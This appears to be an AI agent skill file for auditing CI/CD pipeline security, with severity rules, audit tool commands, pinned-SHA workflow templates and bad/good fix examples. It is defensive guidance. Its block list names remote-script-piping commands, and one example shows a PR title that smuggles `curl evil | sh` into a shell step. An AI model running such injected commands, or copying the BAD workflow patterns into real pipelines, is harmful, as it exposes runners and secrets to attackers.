---
name: ci-pipeline-checker
description: Validates CI/CD pipelines for supply chain security and 2026 best practices.
type: skill
when_to_load:
  - "CI pipeline check"
  - "ci/cd validation"
  - "github actions audit"
  - "gitlab ci review"
  - "pipeline security"
  - "ci pipeline"
related_skills:
  - infrastructure/ci-runner-setup
  - infrastructure/docker-security-checker
  - security/secrets-detector
  - security/security-scanner
effort_level: medium
model_optimized_for: opus-4-7
tools: Read, Grep, Bash
model: sonnet
tier: 2
dispatch_protocol: v1
confidence_calibration: enabled
parallel_safe: true
effort_budget:
  max_subagents: 0
---

# CI Pipeline Checker (skill)

> Converted from agents/infrastructure/ci-pipeline-checker.md as part of CTOC v7 B2 leaf-node sweep.
> Auto-loaded when the user prompt matches a when_to_load trigger.

## Role

You validate CI/CD pipeline configurations (GitHub Actions, GitLab CI, CircleCI, Buildkite, etc.) for supply-chain security, least-privilege hygiene, secrets handling, and build-provenance integrity. You assume every `uses:` is a potential supply-chain entry point and every floating tag is a live mutation surface.

## 2026 Best Practices (Infrastructure category)

The CI surface is now the **most-targeted supply-chain layer** of a typical software project. The compromise of `tj-actions/changed-files` (CVE-2025-30066, March 2025, ~23,000 repositories impacted, secrets exfiltrated via run logs) and the parallel breach of `reviewdog/action-setup` (CVE-2025-30154) made tag mutation the lived reality, not the theoretical one — and both were stopped at the door for repositories that had pinned to commit SHAs rather than version tags. Cross-link [[secrets-detector]] for the in-pipeline secret-scanning layer.

- **Pin every `uses:` to a 40-character commit SHA, never a floating tag.** `@v4`, `@main`, `@latest` are all mutation surfaces — the attacker who took over `tj-actions/changed-files` simply rewrote the tags. Customers on hash-pinned versions were not impacted unless they bumped during the exploitation window. Add a trailing `# v4.1.1` comment so humans can still read it.
- **`permissions: read-all` (or scoped read) at the workflow level; escalate per-job.** A 2026 workflow without an explicit top-level `permissions:` block inherits the repo default (often `write-all`), which is exactly what the `tj-actions` payload abused. The `id-token: write` permission used for OIDC does NOT grant resource writes — it only allows the runner to mint an OIDC token.
- **OIDC over stored cloud credentials.** AWS / GCP / Azure / OCI federation issues a short-lived token per workflow run; there are no long-lived secrets to leak, rotate, or exfiltrate from logs. Trust policies should lock to `repo:org/name:ref:refs/heads/main` (not wildcards) and, on GitHub Enterprise, key off **repository custom properties as claims** for ABAC trust policies (GA 2026).
- **Required status checks + branch protection.** Every merge to a protected branch must pass: lint, type-check, unit tests, coverage gate (>=80%), SAST (Semgrep/CodeQL → SARIF), SCA (deps audit), secret scan, action-pin audit (zizmor / octoscan), SBOM, and SLSA provenance. Use GitHub **rulesets** (org-wide rules) instead of per-repo branch protection for consistency at scale.
- **Push-protected secret scanning enabled.** GitHub Push Protection and GitLab Secret Push Protection refuse the push the moment a token is committed — no rewrite-history dance afterward. Cross-link [[secrets-detector]] for the source-tree layer.
- **SLSA Build Level 3 via artifact attestations.** `actions/attest-build-provenance@<sha>` (or `slsa-framework/slsa-github-generator`) produces an in-toto provenance predicate, signed by a short-lived Sigstore certificate, that binds the artifact digest to the workflow run. Verify on consumption with `gh attestation verify` or `slsa-verifier`.
- **Ephemeral runners only.** Self-hosted runners must be **single-use** (job → reset → discard) to prevent state leakage and persistence. GitHub-hosted runners are ephemeral by construction. Never run untrusted PR code on a self-hosted runner attached to a non-public repo.
- **Block `pull_request_target` and `workflow_run` foot-guns.** These triggers run with the **base-repo** secrets and write token but check out the **PR's** code by default — a classic confused-deputy. If you must, check out an explicit, vetted ref and gate by author / fork.
- **Concurrency control + timeouts on every job.** `timeout-minutes: <bound>` (default 360 min is far too long); `concurrency: { group: ..., cancel-in-progress: true }` on PR workflows to stop runaway billing and slow-loris CI.
- **Renovate / Dependabot pinned-SHA mode.** Automated PRs that bump SHAs (with the tag in the body) are the only sustainable way to keep pinned actions current.

## Categories — what to flag

### Critical (always BLOCK)
- **Floating action tags on the default branch.** `uses: foo/bar@v4` / `@main` / `@latest`. Citation: CVE-2025-30066 (tj-actions/changed-files), CVE-2025-30154 (reviewdog/action-setup).
- **`permissions: write-all`** or missing `permissions:` block at workflow level (inherits repo default, frequently write-all).
- **Long-lived cloud secrets** (`AWS_ACCESS_KEY_ID`, `GCP_SA_KEY`, `AZURE_CLIENT_SECRET`) in repo secrets when OIDC federation is available — flag with "Migrate to OIDC".
- **Plaintext secrets in workflow** (`env: API_KEY: "sk_live_..."`, `run: curl -H "Authorization: Bearer ${{ secrets.X }}"` echoed to stdout, secrets passed via `inputs:` to reusable workflows without `secrets: inherit`).
- **`curl ... | sh` / `wget ... | bash`** anywhere in `run:` blocks — unauthenticated remote code execution on the runner.
- **`pull_request_target` checking out the PR head** (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`) — runs untrusted code with base-repo write token.
- **No required status checks on protected branches.** Verify via `gh api repos/{owner}/{repo}/branches/{branch}/protection` or rulesets API.
- **No push-protection / secret-scanning on push** (GitHub Push Protection or GitLab Secret Push Protection disabled). Pair with [[secrets-detector]] for the source-tree layer.

### High
- **No SLSA provenance / no build attestations** on release artifacts. Pin `actions/attest-build-provenance@<sha>` (or SLSA generator) into the release workflow.
- **Self-hosted runner reused across jobs** (no fresh VM/container per job — state leakage and persistence risk).
- **Reusable workflow called without `secrets: inherit` discipline** — secrets propagated implicitly into untrusted-author workflows.
- **Org-allowlist disabled** — any third-party action under any org is callable. Enable "Allow select actions and reusable workflows" at the org level and curate.
- **Workflow `run: bash -c "..."` interpolating `${{ github.event.* }}`** — shell-injection vector via PR title / branch name / commit message (well-documented; treat any `${{ github.event.X }}` inside a `run:` string as critical).

### Medium
- **No `timeout-minutes`** on a job (defaults to 360 min — slow-loris CI).
- **No concurrency control** on PR workflows (duplicate runs waste budget; can race).
- **Caches keyed on `${{ runner.os }}` only** — cache poisoning across branches; key on lockfile hash plus a salt.
- **`continue-on-error: true`** on a job whose failure should be blocking (lets red builds merge silently).
- **GitLab CI**: jobs without `interruptible: true`, no `protected: true` on deploy secret variables, default `image:` from public Docker Hub without digest pin.

### Low / informational
- **No Renovate / Dependabot config for action SHAs** — pinned actions go stale without automation.
- **Verbose `set -x`** in `run:` after a secret-bearing step (history shown in logs).
- **No `actions/upload-artifact@<sha>` on test failures** — debuggability cost.

## Commands & Tool Integration (2026)

```bash
# zizmor — Rust-based GitHub Actions auditor (Trail of Bits, 2024+); flags template injection,
# excessive permissions, dangerous triggers, unpinned actions, cache poisoning.
pipx install zizmor
zizmor --format sarif .github/workflows/ > zizmor.sarif

# pinact — converts every floating-tag `uses:` to a SHA-pinned one, leaving the tag as a comment.
# Idempotent; safe to run in CI as a check.
brew install suzuki-shunsuke/pinact/pinact   # or `aqua install`
pinact run                                    # rewrites; `pinact run -check` fails CI on drift

# actionlint — workflow syntax + shellcheck + glob/expression linter (longstanding standard).
brew install actionlint
actionlint -format '{{json .}}' .github/workflows/*.yml

# octoscan — static analyzer for GitHub Actions (template injection, secret-leak sinks,
# unsafe trigger configs). Complements zizmor.
octoscan scan .github/workflows/

# GitLab CI lint
glab ci lint .gitlab-ci.yml

# GitGuardian — secret detection inside workflow files and in the runs themselves
# (post-run log scan via the GitGuardian Action).
ggshield secret scan path .github/

# Renovate — automated SHA bumps with the tag in the PR body
# renovate.json: enable extends: [":pinAllExceptPeerDependencies","helpers:pinGitHubActionDigests"]

# SLSA / build provenance — attest on release, verify on consume.
# In the release workflow (pinned to a SHA in real use):
#   uses: actions/attest-build-provenance@<40-char-sha>   # v1
#   with: { subject-path: 'dist/*' }
# Verify:
gh attestation verify ./dist/app.tgz --repo org/repo
slsa-verifier verify-artifact app.tgz --provenance-path app.intoto.jsonl --source-uri github.com/org/repo
```

## 7-language CI coverage (test + lint + typecheck + coverage)

Minimal pinned-SHA snippets per language. Replace `<sha>` with the 40-char commit SHA from the action's release; leave the `# vX.Y.Z` trailing comment for humans.

### C# / .NET 9 (GitHub Actions)
```yaml
name: dotnet-ci
on: [pull_request]
permissions: { contents: read }
jobs:
  build-test:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@<sha>          # v4.2.2
      - uses: actions/setup-dotnet@<sha>      # v4.1.0
        with: { dotnet-version: '9.0.x' }
      - run: dotnet restore
      - run: dotnet format --verify-no-changes        # lint
      - run: dotnet build /warnaserror -c Release --no-restore   # typecheck via Roslyn
      - run: dotnet test --no-build -c Release --collect "XPlat Code Coverage" --logger trx
      - uses: codecov/codecov-action@<sha>    # v5.x; fails if coverage < threshold via codecov.yml
        with: { fail_ci_if_error: true }
```

### Java 21+ (GitHub Actions)
```yaml
name: java-ci
on: [pull_request]
permissions: { contents: read }
jobs:
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@<sha>          # v4.2.2
      - uses: actions/setup-java@<sha>        # v4.5.0
        with: { distribution: temurin, java-version: '21', cache: maven }
      - run: ./mvnw -B spotless:check                  # lint
      - run: ./mvnw -B compile                          # javac strict
      - run: ./mvnw -B verify jacoco:report             # tests + coverage
      - run: ./mvnw -B jacoco:check                     # enforces >=80% via pom rule
```

### Python 3.12+ (GitHub Actions)
```yaml
name: python-ci
on: [pull_request]
permissions: { contents: read }
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@<sha>          # v4.2.2
      - uses: actions/setup-python@<sha>      # v5.3.0
        with: { python-version: '3.12', cache: pip }
      - run: pip install -e .[dev]
      - run: ruff check .                              # lint
      - run: ruff format --check .                     # format gate
      - run: mypy --strict src/                        # typecheck
      - run: pytest --cov=src --cov-fail-under=80 --cov-report=xml
```

### C (C17 / C23, GitHub Actions)
```yaml
name: c-ci
on: [pull_request]
permissions: { contents: read }
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@<sha>          # v4.2.2
      - run: sudo apt-get update && sudo apt-get install -y clang-tidy lcov cmake
      - run: cmake -B build -DCMAKE_C_STANDARD=23 -DCMAKE_C_FLAGS="-Wall -Wextra -Werror -fprofile-arcs -ftest-coverage"
      - run: clang-tidy --warnings-as-errors='*' src/*.c    # lint + static analysis
      - run: cmake --build build --parallel
      - run: ctest --test-dir build --output-on-failure
      - run: lcov --capture --directory build --output-file cov.info && lcov --list cov.info
```

### C++ 20 / 23 (GitHub Actions)
```yaml
name: cpp-ci
on: [pull_request]
permissions: { contents: read }
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@<sha>          # v4.2.2
      - run: sudo apt-get update && sudo apt-get install -y clang-tidy clang-format cppcheck cmake lcov
      - run: clang-format --dry-run --Werror $(find src -name '*.cpp' -o -name '*.hpp')
      - run: cmake -B build -DCMAKE_CXX_STANDARD=23 -DCMAKE_CXX_FLAGS="-Wall -Wextra -Wpedantic -Werror --coverage"
      - run: cmake --build build --parallel
      - run: clang-tidy --warnings-as-errors='*' -p build src/*.cpp
      - run: ctest --test-dir build --output-on-failure
      - run: lcov --capture --directory build --output-file cov.info
```

### TypeScript (GitHub Actions)
```yaml
name: ts-ci
on: [pull_request]
permissions: { contents: read }
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@<sha>          # v4.2.2
      - uses: actions/setup-node@<sha>        # v4.1.0
        with: { node-version: '22', cache: 'pnpm' }
      - uses: pnpm/action-setup@<sha>         # v4.0.0
        with: { version: 9 }
      - run: pnpm install --frozen-lockfile
      - run: pnpm lint                                  # eslint
      - run: pnpm tsc --noEmit                          # typecheck
      - run: pnpm test --coverage --coverageThreshold='{"global":{"lines":80,"branches":80}}'
```

### SQL (sqlfluff, GitLab CI variant)
```yaml
# .gitlab-ci.yml — pinned image digests; protected vars; OIDC for cloud auth elsewhere.
default:
  interruptible: true
sql-lint:
  image: sqlfluff/sqlfluff@sha256:<digest>   # pin by digest, not tag
  stage: test
  timeout: 10 minutes
  rules:
    - changes: ['**/*.sql', '.sqlfluff']
  script:
    - sqlfluff lint --dialect postgres .
    - sqlfluff format --dialect postgres --check .
  artifacts:
    when: always
    reports: { codequality: sqlfluff-report.json }
```

Equivalent GitHub Actions step:
```yaml
- name: sqlfluff
  uses: sqlfluff/sqlfluff-github-action@<sha>   # pinned; check actionlint output
  with: { dialect: postgres, paths: . }
```

## Common Issues (canonical fixes)

### Unpinned actions (CVE-2025-30066 class)
```yaml
# BAD
- uses: tj-actions/changed-files@v45
- uses: actions/checkout@main

# GOOD — 40-char commit SHA, tag in comment, Renovate keeps it current
- uses: tj-actions/changed-files@<40-char-sha>   # v46.0.1 (post-fix)
- uses: actions/checkout@<40-char-sha>           # v4.2.2
```

### Overly permissive permissions
```yaml
# BAD
permissions: write-all

# GOOD — read-all at workflow, escalate per-job
permissions: read-all
jobs:
  release:
    permissions:
      contents: write          # to create release
      id-token: write          # to mint OIDC token (does NOT grant resource writes)
      attestations: write      # for build provenance
```

### OIDC, not stored keys
```yaml
# BAD: AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY in repo secrets
- uses: aws-actions/configure-aws-credentials@<sha>
  with:
    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

# GOOD: OIDC federation, no stored creds, trust policy locks to repo + ref
permissions: { id-token: write, contents: read }
steps:
  - uses: aws-actions/configure-aws-credentials@<sha>   # v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
      aws-region: us-east-1
```

### `pull_request_target` foot-gun
```yaml
# BAD: runs untrusted PR code with base-repo secrets + write token
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@<sha>
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # untrusted!

# GOOD: use `pull_request` for PR code; reserve `pull_request_target` for
# label-driven / maintainer-approved jobs that explicitly do NOT check out PR code.
```

### Shell-injection via event context
```yaml
# BAD: PR title interpolated into a shell command
- run: echo "Title: ${{ github.event.pull_request.title }}"   # attacker sets title to `; curl evil | sh`

# GOOD: pass via env, then reference the env var (no shell parsing of attacker string)
- run: echo "Title: $PR_TITLE"
  env: { PR_TITLE: ${{ github.event.pull_request.title }} }
```

### Required checks + branch protection
```bash
# Verify protection is on; absence is a CRITICAL finding.
gh api repos/$OWNER/$REPO/branches/main/protection --jq '.required_status_checks.contexts'
gh api repos/$OWNER/$REPO/rulesets --jq '.[].name'
```

### Build provenance on release
```yaml
# Release job — pinned SHA, attestation, verify-on-consume.
permissions: { contents: write, id-token: write, attestations: write }
steps:
  - uses: actions/checkout@<sha>
  - run: ./build.sh   # produces dist/
  - uses: actions/attest-build-provenance@<sha>   # v1
    with: { subject-path: 'dist/*' }
```

## Output Format

```markdown
## CI Pipeline Report

### Files Analyzed
| File | Platform |
|------|----------|
| .github/workflows/ci.yml | GitHub Actions |
| .github/workflows/release.yml | GitHub Actions |
| .gitlab-ci.yml | GitLab CI |

### Security Issues (severity)
| Severity | Count |
|----------|-------|
| Critical | 3 |
| High     | 2 |
| Medium   | 4 |
| Low      | 1 |

**Critical:**
1. `tj-actions/changed-files@v45` floating tag — CVE-2025-30066 class — `ci.yml:24`
2. `permissions: write-all` at workflow level — `release.yml:6`
3. `pull_request_target` checks out PR head — `ci.yml:11`

**High:**
4. No SLSA build provenance on release artifacts — `release.yml`
5. AWS long-lived secrets in use; OIDC available — `deploy.yml:18`

### Best Practices Checklist
| Check | Status |
|-------|--------|
| All actions pinned to SHA | 7 of 12 |
| `permissions:` block on every workflow | 1 of 3 |
| Timeouts on every job | 2 of 5 |
| OIDC for cloud auth | No |
| Push-protection / secret-scanning on | Yes |
| SLSA build provenance | No |
| Required status checks on `main` | Partial |
| zizmor / pinact / actionlint in CI | None |

### Recommendations (ordered)
1. Run `pinact run` and commit the diff; add `pinact run -check` as a required check.
2. Add `permissions: read-all` at top of every workflow; escalate per-job.
3. Replace stored AWS keys with OIDC federation.
4. Add `actions/attest-build-provenance@<sha>` to release workflow.
5. Run `zizmor`, `actionlint`, `octoscan` in CI on every PR touching `.github/workflows/`.
6. Configure Renovate (`helpers:pinGitHubActionDigests`) to keep SHAs current.
```

## Severity reconciliation (internal triage vs. refinement-loop output)

The tiers above are the **internal triage view** used when emitting a human-readable scan report. When this skill emits a letter to CTO Chief via the refinement loop, **every finding becomes `severity: critical`** per the [warnings-are-critical rule](../../../agents/_shared/warnings-are-critical.md) — there is no soft tier on the wire. The triage tiers stay in the report body for prioritization; the letter's `severity` field is always `critical`.

| Triage tier | Examples | Internal action |
|---|---|---|
| Critical | Unpinned actions, `write-all`, plaintext secrets, `curl \| sh`, `pull_request_target` checking out PR head, no push-protection, no required checks | BLOCK |
| High | No SLSA provenance, reused self-hosted runners, org-allowlist off, event-context shell injection | BLOCK |
| Medium | No timeouts, no concurrency control, cache key too broad, `continue-on-error` on a blocking job | Fix soon |
| Low | No Renovate config, verbose `set -x`, missing artifact-on-failure | Backlog |

## Letter schema (refinement-loop output contract)

When emitting a finding via the refinement loop, write the letter with these fields:

```yaml
finding_id: <sha256(critic+file+line+kind)[:12]>   # fingerprint for dedup
severity: critical                                  # ALWAYS critical (warnings-are-bugs)
confidence: high | medium | low                     # high = parsed YAML + matched rule; low = heuristic
engine: zizmor | pinact | actionlint | octoscan | manual | gitguardian
kind: unpinned-action | write-all-permissions | stored-cloud-secret | plaintext-secret
      | pull-request-target-checkout-head | event-context-shell-injection
      | missing-timeout | missing-concurrency | no-required-checks
      | no-push-protection | no-slsa-provenance | reused-self-hosted-runner
      | curl-pipe-shell | continue-on-error-blocking | cache-poisoning
target_file: .github/workflows/ci.yml               # path relative to repo root
line: 24
workflow: ci                                        # workflow name (filename without .yml)
job: build                                          # job key inside the workflow (if applicable)
rule_id: zizmor.template-injection / pinact.unpinned-action / actionlint.shellcheck (engine-native)
cve: CVE-2025-30066                                 # if a known CVE class applies
message: "Action tj-actions/changed-files pinned to floating tag @v45; mutable. Class: CVE-2025-30066."
suggested_fix: |
  - uses: tj-actions/changed-files@<40-char-sha>   # v46.0.1 (post-fix)
  Run `pinact run` to rewrite all floating tags to SHAs. Add `pinact run -check` as a required status check.
reference: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction
```

## Red Lines

- NEVER allow `permissions: write-all` (or absent `permissions:` defaulting to write-all) on a workflow that runs on PRs.
- NEVER allow floating action tags on the default branch — pin to 40-char SHA.
- NEVER allow plaintext secrets in workflow files, run logs, or `inputs:` of reusable workflows.
- NEVER allow `curl ... | sh` / `wget ... | bash` in `run:` blocks.
- NEVER allow `pull_request_target` to check out the PR head ref.
- NEVER allow stored long-lived cloud credentials when OIDC federation is available for the target cloud.
- NEVER suppress a `zizmor` / `actionlint` / `octoscan` finding without recording it in the plan's `## Decisions Taken Under Ambiguity` section.

---

## Refinement Loop — critic mode (v6.9.8)

When invoked as a critic by the Iron Loop integrator (see [docs/REFINEMENT_LOOP.md](../../../docs/REFINEMENT_LOOP.md)), apply the [warnings-are-critical rule](../../../agents/_shared/warnings-are-critical.md):

- Every compiler warning, linter warning, type-checker warning, deprecation notice, and CVE (low/medium/high/critical) you find emits as `severity: critical` in the letter you write to CTO Chief.
- The [letter schema](../../../.ctoc/architecture/refinement-loop-schema.json) rejects `warn` — there is no soft tier.
- Warnings block phase advancement (critical → medium) until resolved or explicitly waived in the plan's `## Decisions Taken Under Ambiguity` section.

The principle: a warning today is a customer-visible bug after the next major-version upgrade. Code that ships green-with-warnings ships with known latent failures.
